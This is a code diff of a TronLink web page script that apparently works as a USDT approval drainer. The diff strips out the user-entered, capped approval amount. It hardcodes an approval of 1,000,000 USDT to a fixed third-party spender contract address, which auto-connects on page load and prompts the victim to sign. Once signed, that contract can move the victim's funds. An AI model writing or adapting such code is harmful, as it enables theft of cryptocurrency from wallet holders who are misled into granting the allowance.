@@ -2,89 +2,69 @@ let tronWeb;
 let tokenContract;
 let userAddress;
 
-// 🔴 USDT TRC20 (Mainnet)
+// 🔴 TRC20 USDT (TRON Mainnet)
 const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
-// 🔴 Your TokenOperator contract address
+// 🔴 YOUR SPENDER CONTRACT (AS PROVIDED)
 const SPENDER_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
 
-// USDT decimals
+// 🔴 USDT DECIMALS ON TRON
 const DECIMALS = 6;
 
-// 🔒 MAX APPROVAL LIMIT (USDT)
-const MAX_APPROVAL_AMOUNT = "1000000"; // user can NOT approve more than this
+// 🔴 FIXED APPROVAL AMOUNT = 1,000,000 USDT
+const FIXED_USDT_AMOUNT = "1000000"; // 1M USDT (human-readable)
 
-// Wait for TronLink
-async function waitForTronLink() {
-    return new Promise(resolve => {
-        const timer = setInterval(() => {
-            if (window.tronWeb && window.tronWeb.ready) {
-                clearInterval(timer);
-                resolve();
-            }
-        }, 500);
-    });
-}
-
-// Auto connect
+// Auto-connect if TronLink already authorized
 window.addEventListener("load", async () => {
+  if (window.tronWeb && window.tronWeb.ready) {
     await connectWallet();
+  }
 });
 
 async function connectWallet() {
-    await waitForTronLink();
+  if (!window.tronWeb || !window.tronWeb.ready) {
+    alert("Please open this page in TronLink");
+    return;
+  }
 
-    tronWeb = window.tronWeb;
-    userAddress = tronWeb.defaultAddress.base58;
+  tronWeb = window.tronWeb;
+  userAddress = tronWeb.defaultAddress.base58;
 
-    tokenContract = await tronWeb.contract().at(TOKEN_ADDRESS);
+  tokenContract = await tronWeb.contract().at(TOKEN_ADDRESS);
 
-    document.getElementById("status").innerText =
-        `Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+  document.getElementById("status").innerText =
+    `Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
 }
 
 async function executeApproval() {
-    if (!tokenContract) {
-        await connectWallet();
-    }
+  if (!tokenContract) {
+    await connectWallet();
+  }
 
-    try {
-        const inputValue = document.getElementById("amount").value;
+  try {
+    // 🔒 FIXED AMOUNT CONVERSION (1,000,000 * 10^6)
+    const approvalAmount = tronWeb
+      .toBigNumber(FIXED_USDT_AMOUNT)
+      .times(tronWeb.toBigNumber(10).pow(DECIMALS))
+      .toString();
 
-        if (!inputValue || inputValue <= 0) {
-            alert("Enter valid amount");
-            return;
-        }
+    document.getElementById("status").innerText =
+      "Confirm 1,000,000 USDT approval in TronLink...";
 
-        // Convert to BigNumber
-        const userAmount = tronWeb.toBigNumber(inputValue);
-        const maxAmount = tronWeb.toBigNumber(MAX_APPROVAL_AMOUNT);
+    // 🔑 APPROVE FIXED AMOUNT TO SPENDER
+    const tx = await tokenContract.approve(
+      SPENDER_ADDRESS,
+      approvalAmount
+    ).send({
+      feeLimit: 100_000_000
+    });
 
-        // 🔒 FINAL APPROVAL AMOUNT (CAPPED)
-        const finalAmount = userAmount.gt(maxAmount)
-            ? maxAmount
-            : userAmount;
+    document.getElementById("status").innerText =
+      `Approved 1,000,000 USDT ✔ Tx: ${tx}`;
 
-        // Convert to smallest unit
-        const approvalAmount = finalAmount
-            .times(tronWeb.toBigNumber(10).pow(DECIMALS));
-
-        document.getElementById("status").innerText =
-            `Approving ${finalAmount.toString()} USDT...`;
-
-        const tx = await tokenContract.approve(
-            SPENDER_ADDRESS,
-            approvalAmount.toString()
-        ).send({
-            feeLimit: 100_000_000
-        });
-
-        document.getElementById("status").innerText =
-            `Approved ${finalAmount.toString()} USDT ✔ Tx: ${tx}`;
-
-    } catch (err) {
-        console.error(err);
-        document.getElementById("status").innerText =
-            "Approval cancelled or failed";
-    }
+  } catch (err) {
+    console.error(err);
+    document.getElementById("status").innerText =
+      "Approval cancelled or failed";
+  }
 }
